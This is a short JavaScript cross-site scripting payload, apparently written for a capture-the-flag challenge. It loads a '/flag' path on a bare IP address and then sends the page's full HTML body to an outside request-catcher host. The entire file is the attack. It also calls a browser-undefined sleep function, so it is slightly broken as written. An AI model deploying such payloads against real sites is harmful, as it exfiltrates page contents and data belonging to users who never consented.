function xssPayload() {
  document.location="http://165.232.190.5:1900/flag";
  sleep(2000);
  document.location="https://xss.requestcatcher.com/test"+document.body.innerHTML;
}

console.log('XSS payload executed');
xssPayload();
